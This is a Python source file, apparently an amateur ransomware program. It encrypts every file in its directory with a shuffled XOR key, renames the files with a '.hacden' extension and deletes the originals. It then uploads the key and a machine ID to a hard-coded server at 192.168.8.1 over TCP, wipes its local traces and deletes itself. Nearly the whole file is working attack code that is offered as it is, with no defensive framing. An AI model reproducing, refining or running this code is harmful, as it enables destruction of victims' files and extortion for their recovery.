#-*- coding=utf-8 -*-
#written by Hacden 2020/03/25
import socket
import os
import random
import sys
import uuid
import struct


mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
myaddr = "_".join([mac[e:e+2] for e in range(0,11,2)])
class CRYPT_FILE():
    def __init__(self):
        #key文件名
        self.key_file = [myaddr + "_key",myaddr+"_被加密的文件.txt",myaddr +".txt"]
        self.crypt_dir = "./"
        self.output_name = ".hacden"
        self.exec_file = sys.argv[0].split('\\')[-1]


    # 以乱序的数字来对文件进行加密
    def __gen_key(self):
        #生成数字
        num_key = list(range(256))
        random.shuffle(num_key)
        return num_key

    # 生成秘钥文件
    def __save_keyfile(self,num_key):
        fo = open(self.key_file[0], 'wb')
        fo.write(bytes(num_key))
        fo.close()

    # 读取秘钥文件
    def __get_key(self):
        f_key = open(self.key_file[0], 'rb')
        by_key = f_key.read()
        f_key.close()
        return by_key

    # 加密算法
    def __crypt(self,by_key,input_name):
        crypt_filename = open(self.key_file[1], 'a')
        crypt_filename.write(self.crypt_dir + input_name + "\n")
        crypt_filename.close()
        out_name = input_name.split('.')[0] + self.output_name
        #读源文件
        in_name = open(input_name, 'rb')
        in_f = in_name.read()
        flen = len(in_f)

        buff = []
        for i in range(flen):
            c = i % len(by_key)
            f_data = in_f[i] ^ by_key[c]
            buff.append(f_data)

        # 写加密文件
        output_file = open(out_name, 'wb')
        output_file.write(bytes(buff))
        in_name.close()
        output_file.close()
        # 删除源文件
        os.remove(input_name)

    #获取crypt_dir下的所有文件
    def __get_dir_file_encode(self,by_key):
        file_list = os.listdir(self.crypt_dir)
        file_count = len(file_list)
        for i in range(file_count):
            input_d = os.path.join(self.crypt_dir, file_list[i])
            input_name = input_d.split('/')[-1]
            if input_name == self.exec_file or input_name == self.key_file[0]:
                continue
            # 加密
            self.__crypt(by_key,input_name)
        with open(self.key_file[2],"w") as ma:
            ma.write(myaddr)
            ma.close()
        print('路径 %s 下所有文件已被加密!' % (self.crypt_dir))

    def run(self):
        num_key = self.__gen_key()
        self.__save_keyfile(num_key)
        # 读秘钥文件进行加密
        by_key = self.__get_key()
        self.__get_dir_file_encode(by_key)



#上传秘钥文件到服务器
class PUT_FILE():
    def __init__(self):
        self.connect_ip = "192.168.8.1"
        self.connect_port = 54250
        self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.key_file = [myaddr + "_key",myaddr+"_被加密的文件.txt",myaddr + ".txt"]
        self.exec_file = sys.argv[0].split('\\')[-1]

    def __connect_server(self):
        #ipv4模式tcp协议
        self.so.connect((self.connect_ip,self.connect_port))
        self.so.settimeout(10)

    def __send_file(self):

        for name in self.key_file:
            if os.path.isfile(name):
                fo = open(name, 'rb')
                alldata = b""
                while True:
                    data = fo.read(1024)
                    alldata += data
                    if not data:
                        break
                msg_len = len(alldata)
                msg_lenint_struct = struct.pack('i', msg_len)
                self.so.sendall(msg_lenint_struct + alldata)
                fo.close()

    def run(self):
        self.__connect_server()
        self.__send_file()
        self.so.close()
        # # 删除秘钥文件\删除被加密文件\地址文件
        for dl in self.key_file:
            os.remove(dl)
        #删除自身
        os.remove(self.exec_file)

if __name__ == '__main__':
    crypt = CRYPT_FILE()
    crypt.run()
    put_file = PUT_FILE()
    put_file.run()






